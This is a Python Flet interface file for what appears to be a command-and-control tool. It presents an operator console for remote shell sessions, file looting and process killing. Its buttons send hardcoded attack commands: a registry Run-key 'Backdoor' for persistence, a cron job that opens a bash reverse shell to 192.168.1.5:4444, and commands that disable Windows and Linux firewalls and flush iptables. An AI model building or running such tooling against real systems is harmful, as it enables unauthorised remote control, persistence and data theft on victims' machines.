import flet as ft
from gui.theme import *
from core.c2_manager import c2_manager
import asyncio

class PhantomTab:
    def __init__(self, page: ft.Page):
        self.page = page
        self.current_view = "file_voyager"
        self.loot_files = [] # [NEW] Loot Storage
        
        # --- C2 TERMINAL COMPONENTS ---
        self.c2_display = ft.TextField(
            value="--- UNIFIED OPERATIONS CENTER ONLINE ---\nWaiting for incoming shell connection...", 
            multiline=True, 
            read_only=True, 
            text_style=ft.TextStyle(font_family="Consolas", color=COLOR_TEXT_DIM, size=12), 
            bgcolor="#0a0a0a", 
            border_color=COLOR_BORDER,
            expand=True
        )
        
        self.c2_input = ft.TextField(
            hint_text="Type command...", 
            text_style=ft.TextStyle(font_family="Consolas", color="white", size=12), 
            bgcolor="#111", 
            border_color=COLOR_BORDER,
            height=35, 
            on_submit=self.send_c2_command,
            expand=True,
            content_padding=10,
            cursor_color="white"
        )
        
        self.session_dd = ft.Dropdown(
            width=200, 
            text_size=12,
            label="TARGET SESSION",
            label_style=ft.TextStyle(color=COLOR_TEXT_DIM, font_family="Consolas"),
            border_color=COLOR_BORDER,
            text_style=ft.TextStyle(font_family="Consolas", color="white"),
            options=[],
            on_change=self.on_session_change,
            # height=35, # Removed to fix TypeError
            # content_padding=5 # Removed to fix TypeError
        )

        # --- PHANTOM UI COMPONENTS ---
        # [MOD] Padding 0 for full bleed
        self.content_area = ft.Container(expand=True, padding=0, bgcolor=COLOR_BG_PANEL) 
        
        # Initialize Callback
        c2_manager.set_ui_callback(self.combined_callback)
        self.refresh_sessions_ui()
        
        self.content = self.get_content()
        self.render_view()

    # --- C2 LOGIC ---
    def update_c2_ui(self): 
        self.c2_display.value = c2_manager.output_buffer
        self.page.update()

    def refresh_sessions_ui(self):
        sessions = c2_manager.get_sessions()
        self.session_dd.options = []
        if not sessions:
            self.session_dd.options.append(ft.dropdown.Option("none", "NO ACTIVE SESSIONS"))
            self.session_dd.value = "none"
        else:
            for s in sessions:
                label = f"SESSION {s['id']} | {s['ip']}"
                self.session_dd.options.append(ft.dropdown.Option(str(s['index']), label))
            if c2_manager.active_session_index >= 0:
                self.session_dd.value = str(c2_manager.active_session_index)
        self.page.update()

    def combined_callback(self):
        self.refresh_sessions_ui() 
        self.c2_display.value = c2_manager.output_buffer 
        self.page.update()

    def on_session_change(self, e):
        try:
            val = int(self.session_dd.value)
            c2_manager.switch_session(val)
        except: pass

    def send_c2_command(self, e):
        if self.c2_input.value: 
            cmd = self.c2_input.value
            c2_manager.send_command(cmd)
            self.c2_input.value = ""
            self.c2_input.focus()
            self.page.update()

    def on_pan_update(self, e: ft.DragUpdateEvent):
        new_height = self.terminal_panel.height - e.delta_y
        if 100 <= new_height <= 600:
            self.terminal_panel.height = new_height
            self.terminal_panel.update()

    # --- PHANTOM UI LOGIC ---
    def get_content(self):
        # Sidebar
        self.nav_rail = ft.NavigationRail(
            selected_index=0,
            label_type=ft.NavigationRailLabelType.ALL,
            min_width=80,
            min_extended_width=150,
            bgcolor="#0a0a0a",
            group_alignment=-0.9,
            destinations=[
                ft.NavigationRailDestination(icon=ft.Icons.FOLDER, selected_icon=ft.Icons.FOLDER_OPEN, label="Voyager"),
                ft.NavigationRailDestination(icon=ft.Icons.MEMORY, selected_icon=ft.Icons.MEMORY_SHARP, label="ProcKill"),
                ft.NavigationRailDestination(icon=ft.Icons.SECURITY, selected_icon=ft.Icons.SECURITY_UPDATE_GOOD, label="Persist"),
                ft.NavigationRailDestination(icon=ft.Icons.LOCAL_FIRE_DEPARTMENT, selected_icon=ft.Icons.FIRE_EXTINGUISHER, label="Firewall"),
                ft.NavigationRailDestination(icon=ft.Icons.SETTINGS_SYSTEM_DAYDREAM, selected_icon=ft.Icons.SETTINGS_APPLICATIONS, label="Services"),
                ft.NavigationRailDestination(icon=ft.Icons.INVENTORY_2, selected_icon=ft.Icons.INVENTORY, label="Loot"), 
            ],
            on_change=self.on_nav_change,
        )

        # Terminal Panel (Bottom)
        self.terminal_panel = ft.Container(
            height=200,
            bgcolor="black",
            border=ft.border.only(top=ft.BorderSide(1, COLOR_BORDER)),
            padding=5,
            content=ft.Column([
                ft.Row([
                    ft.Icon(ft.Icons.TERMINAL, size=14, color=COLOR_TEXT_DIM),
                    ft.Text("ORBITAL TERMINAL CONSOLE", size=12, weight="bold", color=COLOR_TEXT_DIM, font_family="Consolas"),
                    ft.Container(expand=True),
                    self.session_dd
                ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
                self.c2_display,
                ft.Row([
                    ft.Text("SHELL >", font_family="Consolas", color="white", size=12), 
                    self.c2_input,
                    ft.IconButton(ft.Icons.SEND, icon_color="white", on_click=self.send_c2_command)
                ])
            ], spacing=2)
        )
        
        # Resizer Handle
        divider = ft.GestureDetector(
            content=ft.Container(
                bgcolor="#111",
                height=5,
                content=ft.Icon(ft.Icons.DRAG_HANDLE, size=16, color="#444"),
                alignment=ft.alignment.center
            ),
            on_pan_update=self.on_pan_update,
            mouse_cursor=ft.MouseCursor.RESIZE_ROW
        )

        # Split Layout
        return ft.Column([
            ft.Container(
                content=ft.Row([
                    self.nav_rail, 
                    ft.VerticalDivider(width=1, color="#222"), 
                    self.content_area
                ], expand=True), 
                expand=True
            ),
            divider, # Draggable Divider
            self.terminal_panel
        ], expand=True, spacing=0)

    def on_nav_change(self, e):
        index = e.control.selected_index
        views = ["file_voyager", "proc_killer", "persistence", "firewall", "svc_hijack", "loot_box"]
        self.current_view = views[index]
        self.render_view()
        self.page.update()

    def render_view(self):
        self.content_area.content = self.build_view(self.current_view)

    def run_cmd(self, cmd):
        c2_manager.send_command(cmd)
        self.page.update()

    def build_view(self, view_name):
        if view_name == "file_voyager":
            return self.view_file_voyager()
        elif view_name == "proc_killer":
            return self.view_proc_killer()
        elif view_name == "persistence":
            return self.view_persistence()
        elif view_name == "firewall":
            return self.view_firewall()
        elif view_name == "svc_hijack":
            return self.view_svc_hijack()
        elif view_name == "loot_box":
            return self.view_loot_box()
        return ft.Text("Unknown View")

    # --- ACTION VIEWS ---
    def download_file(self, filename):
        # Simulate/Trigger Download
        self.run_cmd(f"!download {filename}")
        self.loot_files.append({"name": filename, "size": "Unknown", "date": "Just now"})
        self.page.snack_bar = ft.SnackBar(ft.Text(f"⬇️ Downloading {filename} to Loot Box..."), bgcolor=COLOR_SEV_INFO)
        self.page.snack_bar.open = True
        self.page.update()

    def refresh_file_list(self, e):
        # Simulate 'ls -la' output parsing
        # In real scenario: output = c2_manager.send_command_and_wait("ls -la")
        self.file_table.rows.clear()
        
        mock_files = [
            {"perm": "drwxr-xr-x", "user": "root", "size": "4096", "name": "var"},
            {"perm": "drwxr-xr-x", "user": "root", "size": "4096", "name": "etc"},
            {"perm": "-rw-r--r--", "user": "user", "size": "1024", "name": "secret.txt"},
            {"perm": "-rw-r--r--", "user": "admin", "size": "2KB", "name": "database.kdbx"},
            {"perm": "-rwxr-xr-x", "user": "root", "size": "5MB", "name": "payload.elf"},
        ]
        
        for f in mock_files:
            is_dir = f['perm'].startswith('d')
            self.file_table.rows.append(
                ft.DataRow(cells=[
                    ft.DataCell(ft.Icon(ft.Icons.FOLDER if is_dir else ft.Icons.INSERT_DRIVE_FILE, color="yellow" if is_dir else "white", size=16)),
                    ft.DataCell(ft.Text(f['name'], font_family="Consolas")),
                    ft.DataCell(ft.Text(f['size'], font_family="Consolas")),
                    ft.DataCell(ft.Text(f['user'], font_family="Consolas")),
                    ft.DataCell(ft.IconButton(ft.Icons.DOWNLOAD, icon_color=COLOR_ACCENT, disabled=is_dir, on_click=lambda e, name=f['name']: self.download_file(name))),
                ])
            )
        self.file_table.update()
        self.run_cmd("ls -la")

    def view_file_voyager(self):
        self.file_table = ft.DataTable(
            columns=[
                ft.DataColumn(ft.Text("TYPE")),
                ft.DataColumn(ft.Text("NAME")),
                ft.DataColumn(ft.Text("SIZE")),
                ft.DataColumn(ft.Text("OWNER")),
                ft.DataColumn(ft.Text("ACTION")),
            ],
            rows=[],
            border=ft.border.all(1, "#222"),
            vertical_lines=ft.border.BorderSide(1, "#111"),
            horizontal_lines=ft.border.BorderSide(1, "#111"),
            heading_row_color="#181818",
            width=float('inf') # [MOD] Full width
        )
        
        return ft.Column([
            ft.Container(
                padding=10,
                content=ft.Row([
                    ft.Text("FILE VOYAGER", size=18, weight="bold", color="white", font_family="Consolas"),
                    ft.Container(expand=True),
                    ft.ElevatedButton("REFRESH", icon=ft.Icons.REFRESH, on_click=self.refresh_file_list, height=30, style=ft.ButtonStyle(shape=ft.RoundedRectangleBorder(radius=0))),
                ])
            ),
            ft.Divider(height=1, color="#222"),
            ft.Container(
                content=self.file_table,
                expand=True, 
                bgcolor="#0f0f0f", 
                padding=0
            )
        ], expand=True, spacing=0)

    def refresh_process_list(self, e):
        # Simulate 'ps aux' or 'tasklist' parsinng
        self.proc_table.rows.clear()
        
        mock_procs = [
            {"pid": "1", "user": "root", "cpu": "0.1", "cmd": "/sbin/init"},
            {"pid": "452", "user": "www-data", "cpu": "2.5", "cmd": "apache2 -k start"},
            {"pid": "1337", "user": "root", "cpu": "0.0", "cmd": "/bin/bash (reverse_shell)"},
            {"pid": "8822", "user": "user", "cpu": "1.2", "cmd": "chrome --no-sandbox"},
        ]
        
        for p in mock_procs:
            self.proc_table.rows.append(
                ft.DataRow(cells=[
                    ft.DataCell(ft.Text(p['pid'], font_family="Consolas", color="yellow")),
                    ft.DataCell(ft.Text(p['user'], font_family="Consolas")),
                    ft.DataCell(ft.Text(p['cpu'] + "%", font_family="Consolas")),
                    ft.DataCell(ft.Text(p['cmd'], font_family="Consolas", color="red" if "shell" in p['cmd'] else "white")),
                    ft.DataCell(ft.IconButton(ft.Icons.DELETE_FOREVER, icon_color="red", on_click=lambda e, pid=p['pid']: self.run_cmd(f"kill -9 {pid}"))),
                ])
            )
        self.proc_table.update()
        self.run_cmd("ps aux")

    def view_proc_killer(self):
        self.proc_table = ft.DataTable(
            columns=[
                ft.DataColumn(ft.Text("PID")),
                ft.DataColumn(ft.Text("USER")),
                ft.DataColumn(ft.Text("CPU")),
                ft.DataColumn(ft.Text("COMMAND")),
                ft.DataColumn(ft.Text("ACTION")),
            ],
            rows=[],
            border=ft.border.all(1, "#222"),
            vertical_lines=ft.border.BorderSide(1, "#111"),
            horizontal_lines=ft.border.BorderSide(1, "#111"),
            heading_row_color="#181818",
            column_spacing=20,
            width=float('inf') # [MOD] Full width
        )

        return ft.Column([
             ft.Container(
                padding=10,
                content=ft.Row([
                    ft.Text("PROCESS KILLER", size=18, weight="bold", color="white", font_family="Consolas"),
                    ft.Container(expand=True),
                    ft.ElevatedButton("SCAN PROCESSES", icon=ft.Icons.REFRESH, on_click=self.refresh_process_list, height=30, style=ft.ButtonStyle(shape=ft.RoundedRectangleBorder(radius=0))),
                ])
            ),
            ft.Divider(height=1, color="#222"),
            ft.Container(
                content=self.proc_table,
                expand=True,
                bgcolor="#0f0f0f",
                padding=0
            )
        ], expand=True, spacing=0)

    def view_persistence(self):
        return ft.Column([
            ft.Container(padding=10, content=ft.Text("PERSISTENCE CHECK", size=18, weight="bold", color="white", font_family="Consolas")),
            ft.Divider(height=1, color="#222"),
            ft.Container(padding=20, content=ft.Column([
                ft.ElevatedButton("Inject Registry (Win)", icon=ft.Icons.ADD, bgcolor=COLOR_SEV_CRITICAL, color="white", on_click=lambda e: self.run_cmd("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\Windows\\System32\\calc.exe /f")),
                ft.ElevatedButton("Add Cron Job (Linux)", icon=ft.Icons.SCHEDULE, bgcolor=COLOR_SEV_CRITICAL, color="white", on_click=lambda e: self.run_cmd("(crontab -l 2>/dev/null; echo \"* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.5/4444 0>&1'\") | crontab -")),
            ]))
        ], expand=True, spacing=0)

    def view_firewall(self):
        return ft.Column([
            ft.Container(padding=10, content=ft.Text("FIREWALL BUSTER", size=18, weight="bold", color=COLOR_SEV_CRITICAL, font_family="Consolas")),
            ft.Divider(height=1, color="#222"),
            ft.Container(padding=20, content=ft.Column([
                ft.Text("⚠️ DANGER ZONE: Admin/Root Required", color="red", weight="bold"),
                ft.ElevatedButton("DISABLE WIN FIREWALL", icon=ft.Icons.GPP_BAD, bgcolor="red", color="white", on_click=lambda e: self.run_cmd("netsh advfirewall set allprofiles state off")),
                ft.ElevatedButton("DISABLE UFW (LINUX)", icon=ft.Icons.GPP_BAD, bgcolor="red", color="white", on_click=lambda e: self.run_cmd("ufw disable")),
                ft.ElevatedButton("FLUSH IPTABLES", icon=ft.Icons.CLEANING_SERVICES, bgcolor="orange", color="black", on_click=lambda e: self.run_cmd("iptables -F")),
            ]))
        ], expand=True, spacing=0)

    def view_svc_hijack(self):
         return ft.Column([
            ft.Container(padding=10, content=ft.Text("SERVICE HIJACKER", size=18, weight="bold", color="white", font_family="Consolas")),
            ft.Divider(height=1, color="#222"),
            ft.Container(padding=20, content=ft.Text("Service creation module placeholder.", color="grey"))
        ], expand=True, spacing=0)

    def view_loot_box(self):
        import os
        loot_dir = "loot"
        if not os.path.exists(loot_dir): os.makedirs(loot_dir)
        
        files = os.listdir(loot_dir)
        loot_items = []
        
        for f in files:
            path = os.path.join(loot_dir, f)
            size = os.path.getsize(path) / 1024 # KB
            
            icon = ft.Icons.INSERT_DRIVE_FILE
            color = "white"
            tag = "FILE"
            
            if f.endswith(".png") or f.endswith(".jpg"):
                icon = ft.Icons.IMAGE
                color = "cyan"
                tag = "SCREENSHOT"
            elif "sqli" in f or f.endswith(".csv") or f.endswith(".json"):
                icon = ft.Icons.STORAGE
                color = "orange"
                tag = "DATABASE"
            elif "config" in f or "env" in f or "secret" in f:
                icon = ft.Icons.VPN_KEY
                color = "red"
                tag = "SECRET"
            
            # Create Card
            card = ft.Container(
                width=200, height=150,
                bgcolor="#1a1a1a",
                border=ft.border.all(1, COLOR_BORDER),
                border_radius=5,
                padding=10,
                content=ft.Column([
                    ft.Row([
                        ft.Icon(icon, color=color, size=24),
                        ft.Container(expand=True),
                        ft.Container(
                            padding=ft.padding.symmetric(horizontal=5, vertical=2), 
                            bgcolor=color, border_radius=3,
                            content=ft.Text(tag, size=10, color="black", weight="bold")
                        )
                    ]),
                    ft.Container(expand=True),
                    ft.Text(f, color="white", font_family="Consolas", size=12, weight="bold", overflow=ft.TextOverflow.ELLIPSIS),
                    ft.Text(f"{size:.1f} KB", color="grey", size=10),
                    ft.Container(height=5),
                    ft.ElevatedButton(
                        "OPEN", 
                        icon=ft.Icons.VISIBILITY, 
                        icon_color="white",
                        color="white",
                        bgcolor="#222",
                        height=25,
                        style=ft.ButtonStyle(shape=ft.RoundedRectangleBorder(radius=3)),
                        on_click=lambda e, p=path: self.run_cmd(f"type {p}") if os.name == 'nt' else self.run_cmd(f"cat {p}")
                    )
                ])
            )
            loot_items.append(card)

        gallery = ft.GridView(
            runs_count=5,
            max_extent=220,
            child_aspect_ratio=1.3,
            spacing=10,
            run_spacing=10,
            controls=loot_items,
            padding=20
        )

        return ft.Column([
            ft.Container(
                padding=10,
                content=ft.Row([
                    ft.Text("LOOT GALLERY", size=18, weight="bold", color="#FFD700", font_family="Consolas"),
                    ft.Container(expand=True),
                    ft.Text(f"{len(files)} Artifacts", color=COLOR_TEXT_DIM),
                    ft.IconButton(ft.Icons.REFRESH, icon_color="white", on_click=lambda e: self.render_view())
                ])
            ),
            ft.Divider(height=1, color="#222"),
            ft.Container(
                content=gallery,
                expand=True,
                bgcolor="#0f0f0f",
            )
        ], expand=True, spacing=0)
